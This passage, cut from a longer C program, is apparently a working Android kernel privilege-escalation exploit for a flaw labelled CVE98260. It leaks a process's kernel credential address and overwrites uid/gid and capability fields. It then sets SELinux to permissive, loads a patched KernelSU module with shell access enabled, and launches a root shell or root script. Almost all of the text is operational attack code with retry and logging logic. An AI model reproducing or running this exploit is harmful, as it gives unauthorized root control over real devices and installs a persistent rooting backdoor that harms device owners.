                hello == CHILD_HELLO) {
                logf("[cred] attempt=%d child=%d R=%#llx site_low=%#llx "
                       "recs=%d matches=%d\n",
                       attempt, p, R, site & 0x1fffff, c, cred_matches);
                *out_pid = p;
                *out_go = go[1];
                *out_st = st[0];
                return R;
            }
        }
        logf("[cred] attempt=%d child=%d R=%#llx hello=%#x recs=%d "
               "matches=%d failed\n",
               attempt, p, R, hello, c, cred_matches);
        close(go[1]);
        close(st[0]);
        kill(p, SIGKILL);
        waitpid(p, NULL, 0);
    }
    return 0;
}

static int wait_child_main(int shell_mode)
{
    struct child_report rep;
    char ch;
    int hello = CHILD_HELLO;

    (void)signal(SIGPIPE, SIG_IGN);
    pin(g_cpu);
    if (write(4, &hello, sizeof(hello)) != sizeof(hello))
        _exit(130);
    if (read(3, &ch, 1) != 1)
        _exit(131);
    close(3);

    {
        const char *ksu = getenv("CVE_KSU_MODE");

        if (ksu && !strcmp(ksu, "1")) {
            const char *ko = getenv("CVE_KSU_PATCHED");
            int fd = -1, fe = 0;
            long rc = -1;
            long sf_ret, sfg_ret;
            int sf_errno, sfg_errno;

            memset(&rep, 0, sizeof(rep));
            rep.magic = CHILD_MAGIC;
            rep.uid = (int)syscall(SYS_getuid);
            rep.euid = (int)syscall(SYS_geteuid);

            /*
             * P1-5: the parent plants uid/gid=0 only.  The child sets the
             * filesystem ids from those planted values.  This is accepted
             * because the new fsuid/fsgid equal old uid/gid (already 0),
             * and cap_task_fix_setuid's setfsuid mask preserves
             * CAP_SYS_MODULE (bit 16).
             */
            errno = 0;
            sf_ret = syscall(SYS_setfsuid, 0);
            sf_errno = errno;
            errno = 0;
            sfg_ret = syscall(SYS_setfsgid, 0);
            sfg_errno = errno;
            {
                /* setfsuid(-1) returns the current fsuid without changing it. */
                int cur_fsuid = (int)syscall(SYS_setfsuid, -1);
                int cur_fsgid = (int)syscall(SYS_setfsgid, -1);

                logf("[child] setfsuid/setfsgid 0: prev=%ld/%ld errno=%d/%d "
                       "fsuid=%d fsgid=%d uid=%d euid=%d\n",
                       sf_ret, sfg_ret, sf_errno, sfg_errno,
                       cur_fsuid, cur_fsgid,
                       (int)syscall(SYS_getuid), (int)syscall(SYS_geteuid));
            }
            rep.uid = (int)syscall(SYS_getuid);
            rep.euid = (int)syscall(SYS_geteuid);
            if (!ko || !*ko) {
                rep.ksu_ret = -2;
                logf("[-] child: CVE_KSU_PATCHED missing\n");
            } else if ((fd = open(ko, O_RDONLY | O_CLOEXEC)) < 0) {
                fe = errno;
                rep.ksu_ret = -3;
                rep.ksu_errno = fe;
                logf("[-] child: open %s failed errno=%d\n", ko, fe);
            } else {
                errno = 0;
                rc = syscall(SYS_finit_module, fd, "allow_shell=1", 0);
                fe = errno;
                close(fd);
                rep.ksu_ret = (int)rc;
                rep.ksu_errno = fe;
                logf("[child] finit_module(%s)=%ld errno=%d uid=%d euid=%d\n",
                       ko, rc, fe, rep.uid, rep.euid);
            }
            (void)write(4, &rep, sizeof(rep));
            close(4);
            _exit(rep.ksu_ret == 0 ? 0 : 2);
        }
    }

    memset(&rep, 0, sizeof(rep));
    rep.magic = CHILD_MAGIC;
    rep.uid = (int)syscall(SYS_getuid);
    rep.euid = (int)syscall(SYS_geteuid);
    logf("[child] woke uid=%d euid=%d\n", rep.uid, rep.euid);
    if (rep.uid != 0) {
        rep.setuid_ret = -1;
        (void)write(4, &rep, sizeof(rep));
        close(4);
        logf("[-] child uid is not 0: cred write did not land\n");
        _exit(3);
    }

    errno = 0;
    rep.setuid_ret = (int)syscall(SYS_setuid, 0);
    rep.setuid_errno = errno;
    {
        uid_t ru = 0, eu = 0, su = 0;

        getresuid(&ru, &eu, &su);
        rep.ruid = (int)ru;
        rep.reuid = (int)eu;
        rep.rsuid = (int)su;
    }
    (void)write(4, &rep, sizeof(rep));
    close(4);
    logf("[child] setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
           rep.setuid_ret, rep.setuid_errno, rep.ruid, rep.reuid, rep.rsuid);
    if (rep.setuid_ret != 0) {
        logf("[-] setuid(0) failed; not running a shell\n");
        _exit(4);
    }

    {
        if (shell_mode) {
            char *const av[] = { (char *)"sh", (char *)"-i", NULL };

            execve("/system/bin/sh", av, (char *const *)cve_child_env());
        } else {
            char *const av[] = { (char *)"sh", (char *)"-c",
                (char *)"id; cat /proc/self/attr/current; "
                        "if [ -n \"$CVE_ROOT_SCRIPT\" ] && [ -f \"$CVE_ROOT_SCRIPT\" ]; "
                        "then sh \"$CVE_ROOT_SCRIPT\"; echo ROOT_SCRIPT_RC=$?; fi; "
                        "echo ROOT_SHELL_OK", NULL };

            execve("/system/bin/sh", av, (char *const *)cve_child_env());
        }
    }
    logf("[-] shell exec failed errno=%d\n", errno);
    _exit(5);
}

static int read_text_file(const char *path, char *out, size_t cap)
{
    int fd, n;

    if (!cap)
        return -EINVAL;
    fd = open(path, O_RDONLY);
    if (fd < 0)
        return -errno;
    n = read(fd, out, cap - 1);
    close(fd);
    if (n < 0)
        return -errno;
    out[n] = 0;
    return n;
}

static int read_int_file(const char *path)
{
    char buf[64];
    int n = read_text_file(path, buf, sizeof(buf));

    if (n < 0)
        return n;
    return atoi(buf);
}

static unsigned long long read_pid_status_hex(pid_t pid, const char *key)
{
    char line[256];
    char prefix[32];
    char path[64];
    unsigned long long value = 0;
    FILE *f;

    snprintf(path, sizeof(path), "/proc/%d/status", (int)pid);
    f = fopen(path, "r");
    if (!f)
        return 0;
    snprintf(prefix, sizeof(prefix), "%s:", key);
    while (fgets(line, sizeof(line), f))
        if (!strncmp(line, prefix, strlen(prefix)) &&
            sscanf(line + strlen(prefix), "%llx", &value) == 1)
            break;
    fclose(f);
    return value;
}

int cve98260_wait(int shell_mode)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    return wait_child_main(shell_mode);
}

static int ksu_grant_root(void)
{
    int fd = -1;
    long rc, g;

    errno = 0;
    rc = syscall(SYS_reboot, KSU_MAGIC1, KSU_MAGIC2, 0, &fd);
    logf("[ksu] grant fd: rc=%ld errno=%d fd=%d\n", rc, errno, fd);
    if (fd < 0)
        return -1;
    errno = 0;
    g = ioctl(fd, KSU_IOCTL_GRANT_ROOT, 0);
    logf("[ksu] GRANT_ROOT rc=%ld errno=%d uid=%d euid=%d\n",
           g, errno, getuid(), geteuid());
    close(fd);
    return (int)g;
}

/* /proc/modules has a live kernelsu module (not just a stale entry). */
static int ksu_module_live(void)
{
    FILE *f = fopen("/proc/modules", "r");
    char line[256];
    int live = 0;

    if (!f)
        return 0;
    while (fgets(line, sizeof(line), f)) {
        if (!strncmp(line, "kernelsu ", 9)) {
            live = 1;
            break;
        }
    }
    fclose(f);
    return live;
}

/*
 * Run a command through the existing KernelSU su channel.  Exec
 * /system/bin/su directly rather than through PATH: on a boot where the bind
 * view is absent but /data/adb/ksud exists, the KernelSU execve hook can
 * still redirect the path; a PATH lookup would fail before execve.
 *
 * Returns 0 when the child exits 0; the caller checks the output for the
 * ksu SELinux domain where that matters.  A missing /data/adb/ksud, an
 * unallowlisted shell, or a module loaded without allow_shell=1 all return
 * -1, which selects the GRANT_ROOT bootstrap path.
 */
static int ksu_su_cmd(const char *cmd, char *out, size_t outsz)
{
    int pfd[2];
    pid_t p;
    size_t used = 0;
    int st = 0;
    int timed_out = 0;
    struct pollfd pf;

    if (outsz)
        out[0] = 0;
    if (pipe(pfd) < 0)
        return -1;
    p = fork();
    if (p < 0) {
        close(pfd[0]);
        close(pfd[1]);
        return -1;
    }
    if (p == 0) {
        char *const av[] = {
            (char *)"su", (char *)"-c", (char *)cmd, NULL
        };

        dup2(pfd[1], STDOUT_FILENO);
        dup2(pfd[1], STDERR_FILENO);
        close(pfd[0]);
        close(pfd[1]);
        execve("/system/bin/su", av, (char *const *)cve_child_env());
        _exit(127);
    }
    close(pfd[1]);
    pf.fd = pfd[0];
    pf.events = POLLIN;
    pf.revents = 0;
    if (poll(&pf, 1, 5000) <= 0) {
        timed_out = 1;
    } else {
        ssize_t n;

        while ((n = read(pfd[0], out + used,
                         outsz > used + 1 ? outsz - used - 1 : 0)) > 0) {
            used += (size_t)n;
            if (!outsz || used + 1 >= outsz)
                break;
        }
    }
    close(pfd[0]);
    if (timed_out)
        kill(p, SIGKILL);
    waitpid(p, &st, 0);
    if (outsz)
        out[used < outsz ? used : outsz - 1] = 0;
    if (timed_out)
        return -1;
    if (!WIFEXITED(st) || WEXITSTATUS(st) != 0)
        return -1;
    return 0;
}

/* root_stage normally restores enforcing; do it through the working su. */
static void ksu_restore_enforcing(void)
{
    char out[128];

    if (ksu_su_cmd("echo 1 > /sys/fs/selinux/enforce", out,
                   sizeof(out)) == 0)
        logf("[ksu] selinux enforcing restored via su\n");
    else
        logf("[!] selinux enforcing restore failed: %s\n", out);
}

/*
 * Run root_stage from a fresh child.  The parent must stay alive: it still
 * owns any failed-plant zombies, and a shell that inherit them may reap them
 * and panic the kernel.  waitpid() targets only the script child.
 */
static int ksu_run_stage(void)
{
    const char *script = getenv("CVE_ROOT_SCRIPT");
    pid_t p;
    int st = 0;

    if (!script || !*script)
        return -1;
    p = fork();
    if (p == 0) {
        char *const av[] = { (char *)"sh", (char *)script, NULL };

        execve("/system/bin/sh", av, (char *const *)cve_child_env());
        _exit(127);
    }
    if (p < 0 || waitpid(p, &st, 0) != p)
        return -1;
    return st;
}

static int cve98260_worker_main(int argc, char **argv)
{
    unsigned char *raw;
    struct ev *evs;
    int shell_mode = 0, leak_only = 0;
    const char *ksu_mode;

    setvbuf(stdout, NULL, _IONBF, 0);
    if (argc > 1 && !strcmp(argv[1], "kopatch"))
        return ko_patch_cli(argc - 1, argv + 1);
    if (argc > 1 && !strcmp(argv[1], "suprobe")) {
        char probe[512];
        int r = ksu_su_cmd("id", probe, sizeof(probe));

        if (r == 0 && !strstr(probe, "u:r:ksu:s0"))
            r = -1;
        logf("[ksu] suprobe rc=%d out=%s", r, probe);
        return r == 0 ? 0 : 1;
    }
    if (argc > 1 && !strcmp(argv[1], "ksugrant")) {
        if (ksu_grant_root() != 0 || geteuid() != 0) {
            logf("[-] KernelSU grant failed\n");
            return 1;
        }
        {
            int st = ksu_run_stage();

            logf("[ksu] root_stage status=%#x\n", st);
            logf("%s\n", st == 0 ? "KSU_CHAIN_OK" : "KSU_CHAIN_FAIL");
            return st == 0 ? 0 : 1;
        }
    }
    if (argc > 1 && !strcmp(argv[1], "shell"))
        shell_mode = 1;
    if (argc > 1 && !strcmp(argv[1], "leak"))
        leak_only = 1;

    raw = malloc(48u << 20);
    evs = malloc(sizeof(*evs) * 400000);
    if (!raw || !evs) return 1;
    if (argc > 2 && !strcmp(argv[1], "cpu")) g_cpu = atoi(argv[2]);

    if (argv[0] && argv[0][0] == '\0')
        _exit(42);

    {
        int pc = vuln_precheck("app", argc, argv, 1, 0);
        if (pc == CVE98260_PRECHECK_EXIT_OK)
            return 0;
        if (pc != 0)
            return 2;
    }
    if (!cve98260_active_profile) {
        logf("[-] no matching kernel profile\n");
        return 2;
    }

    pin(g_cpu);
    if (cve98260_trace_ids_init(g_cpu, leak_only, 0) != 0) {
        logf("[-] trace event id probe failed\n");
        return 1;
    }
    logf("[+] pid=%d cpu=%d\n", getpid(), g_cpu);
    enable_events();
    kick_rss();
    usleep(50000);

    g_base = calibrate_base(raw, evs);
    if (!g_base) { logf("[-] base calibration failed\n"); return 1; }
    prefill_timers(PREFILL_TIMERS);

    pid_t C = -1;
    int go_fd = -1, st_fd = -1;
    unsigned long long R = leak_cred(raw, evs, &C, &go_fd, &st_fd, shell_mode);
    if (!R) { logf("[-] cred leak failed\n"); return 1; }
    logf("[+] child=%d cred=%#llx\n", C, R);
    if (leak_only) {
        close(go_fd);
        close(st_fd);
        kill(C, SIGKILL);
        waitpid(C, NULL, 0);
        logf("[+] leak-only run complete\n");
        return 0;
    }
    ensure_pool();
    ensure_raw();

    ksu_mode = getenv("CVE_KSU_MODE");
    if (ksu_mode && !strcmp(ksu_mode, "1")) {
        const char *ko, *po, *sy, *kr;
        struct plant_res r;
        struct child_report rep;
        ssize_t rn = -1;
        int a;

        memset(&r, 0, sizeof(r));
        for (a = 0; a < 6; a++) {
            int enforce;

            logf("[+] selinux plant attempt %d/6\n", a + 1);
            run_plant(0, PLANT_SELINUX, 1, &r, raw, evs);
            if (!r.ok)
                continue;
            enforce = read_int_file("/sys/fs/selinux/enforce");
            if (enforce == 0) {
                logf("[ksu] selinux permissive, slide=%#llx verified\n",
                       g_slide);
                break;
            }
            logf("[!] selinux verify miss enforce=%d plant=%d\n",
                   enforce, a + 1);
        }
        if (a == 6) {
            if (g_held)
                park_forever("no verified selinux plant");
            confirm_victim_reaped();
            logf("KSU_CHAIN_FAIL\n");
            return 1;
        }

        ko = getenv("CVE_KSU_KO");
        po = getenv("CVE_KSU_PATCHED");
        sy = getenv("CVE_KSU_SYMS");
        kr = getenv("CVE_KREL");
        if (!ko || !po || !sy || !kr) {
            logf("[-] KSU env missing\n");
            if (g_held)
                park_forever("ksu env missing; held zombies");
            return 1;
        }
        {
            char sbuf[32];
            char *av[7];

            snprintf(sbuf, sizeof(sbuf), "%#llx", g_slide);
            av[0] = (char *)"ko_patch";
            av[1] = (char *)ko;
            av[2] = (char *)po;
            av[3] = (char *)sy;
            av[4] = sbuf;
            av[5] = (char *)kr;
            av[6] = NULL;
            logf("[ksu] ko_patch slide=%s release=%s\n", sbuf, kr);
            if (ko_patch_cli(6, av) != 0) {
                logf("[-] ko_patch failed\n");
                if (g_held)
                    park_forever("ko_patch failed; held zombies");
                return 1;
            }
        }

        memset(&r, 0, sizeof(r));
        for (a = 0; a < 6; a++) {
            unsigned long long ce;

            logf("[+] cap plant attempt %d/6\n", a + 1);
            run_plant(R + CRED_CAP_EFFECTIVE, PLANT_PTR, 2, &r, raw, evs);
            if (!r.ok)
                continue;
            ce = read_pid_status_hex(C, "CapEff");
            if (ce & 0x10000ULL) {
                logf("[ksu] cap_effective <- %#llx verified\n", ce);
                break;
            }
            logf("[!] cap verify miss ce=%#llx plant=%d\n", ce, a + 1);
        }
        if (a == 6) {
            if (g_held)
                park_forever("no verified cap plant");
            confirm_victim_reaped();
            logf("KSU_CHAIN_FAIL\n");
            return 1;
        }

        /*
         * P1-5: plant uid/gid only.  The child derives fsuid/fsgid with
         * setfsuid(0)/setfsgid(0), eliminating the second cred write.
         */
        memset(&r, 0, sizeof(r));
        for (a = 0; a < 3 && !r.ok; a++) {
            logf("[+] loader uid/gid plant attempt %d/3\n", a + 1);
            run_plant(R + 8, PLANT_ZERO, 3, &r, raw, evs);
        }
        if (!r.ok)
            park_forever("no loader uid/gid plant");

        if (write(go_fd, "A", 1) != 1)
            logf("[!] child wake write failed\n");
        close(go_fd);

        {
            struct pollfd pf = { .fd = st_fd, .events = POLLIN };

            if (poll(&pf, 1, 10000) > 0)
                rn = read(st_fd, &rep, sizeof(rep));
            close(st_fd);
        }
        {
            int st = 0;

            if (waitpid(C, &st, 0) == C)
                logf("[ksu] finit child exit=%#x\n", st);
        }
        if (rn != (ssize_t)sizeof(rep) || rep.magic != CHILD_MAGIC ||
            rep.ksu_ret != 0) {
            logf("[-] finit failed ret=%d errno=%d (report n=%zd)\n",
                   rn == (ssize_t)sizeof(rep) ? rep.ksu_ret : -1,
                   rn == (ssize_t)sizeof(rep) ? rep.ksu_errno : 0, rn);
            if (g_held)
                park_forever("finit failed; held zombies");
            logf("KSU_CHAIN_FAIL\n");
            return 1;
        }
        logf("[ksu] kernelsu module live\n");

        if (!ksu_module_live()) {
            logf("[-] kernelsu is not live in /proc/modules; refusing "
                   "userspace bootstrap\n");
            if (g_held)
                park_forever("module not live; held zombies");
            logf("KSU_CHAIN_FAIL\n");
            return 1;
        }

        {
            char probe[512];
            int pr = ksu_su_cmd("id", probe, sizeof(probe));

            if (pr == 0 && strstr(probe, "u:r:ksu:s0")) {
                logf("[ksu] userspace already usable; skip "
                       "GRANT_ROOT/root_stage (su -c id: %s)\n", probe);
                ksu_restore_enforcing();
                log_worker_stat();
                if (g_held)
                    logf("KSU_CHAIN_HELD\n");
                g_status_sent = 1;
                logf("KSU_CHAIN_OK\n");
                if (g_held)
                    park_forever("userspace already usable; held zombies");
                return 0;
            }
            logf("[ksu] su probe failed rc=%d out=%s\n", pr, probe);
            logf("[ksu] userspace unavailable; GRANT_ROOT bootstrap\n");
        }

        if (ksu_grant_root() != 0 || geteuid() != 0) {
            logf("[-] GRANT_ROOT bootstrap failed; install /data/adb/ksud "
                   "manually (ksud install) and rerun\n");
            if (g_held)
                park_forever("GRANT_ROOT failed; held zombies");
            logf("KSU_CHAIN_FAIL\n");
            return 1;
        }
        logf("[ksu] KSU root, running root_stage (bootstrap path)\n");
        {
            int st = ksu_run_stage();

            logf("[ksu] root_stage status=%#x\n", st);
            if (st != 0) {
                logf("[-] root_stage failed; check /data/adb/ksud and "
                       "root_stage.log\n");
                log_worker_stat();
                if (g_held)
                    logf("KSU_CHAIN_HELD\n");
                g_status_sent = 1;
                logf("KSU_CHAIN_FAIL\n");
                if (g_held)
                    park_forever("root_stage failed; held zombies");
                return 1;
            }
            log_worker_stat();
            if (g_held)
                logf("KSU_CHAIN_HELD\n");
            g_status_sent = 1;
            logf("%s\n", st == 0 ? "KSU_CHAIN_OK" : "KSU_CHAIN_FAIL");
            if (g_held)
                park_forever("root_stage done; failed-plant zombies held");
            return st == 0 ? 0 : 1;
        }
    }

    struct plant_res r;
    memset(&r, 0, sizeof(r));
    for (int a = 0; a < 3 && !r.ok; a++) {
        logf("[+] plant attempt %d/3\n", a + 1);
        run_plant(R + 8, PLANT_ZERO, 1, &r, raw, evs);
    }
    if (!r.ok)
        park_forever("no successful plant");
    logf("[+] cred write landed, waking child\n");

    if (write(go_fd, "A", 1) != 1)
        logf("[!] child wake write failed\n");
    close(go_fd);

    {
        struct child_report rep;
        struct pollfd pf = { .fd = st_fd, .events = POLLIN };
        ssize_t rn = -1;

        if (poll(&pf, 1, 10000) > 0)
            rn = read(st_fd, &rep, sizeof(rep));
        close(st_fd);
        if (rn == (ssize_t)sizeof(rep) && rep.magic == CHILD_MAGIC) {
            logf("[+] child report uid=%d euid=%d setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
                   rep.uid, rep.euid, rep.setuid_ret, rep.setuid_errno,
                   rep.ruid, rep.reuid, rep.rsuid);
            if (rep.setuid_ret != 0 || rep.reuid != 0)
                logf("[!] child did not reach euid 0\n");
        } else {
            logf("[!] child report missing (n=%zd)\n", rn);
        }
    }

    {
        int st = 0;

        if (waitpid(C, &st, 0) == C)
            logf("[+] child exit status=%#x\n", st);
    }
    if (g_held)
        park_forever("root shell finished; failed-plant zombies are held");
    logf("[+] done\n");
    return 0;
}

int cve98260_main(int argc, char **argv)
{
    cve_lifecycle_ignore_signals();
    /* Exec-probe and plant-success fast exit: the new image must not run
     * the exploit again. */
    if (argc > 1 && argv[1] && !strcmp(argv[1], "--exec-ok"))
        _exit(0);
    if (argc > 0 && argv[0] && argv[0][0] == '\0')
        return cve98260_worker_main(argc, argv);
    return cve_lifecycle_supervise(cve98260_worker_main, argc, argv);
}
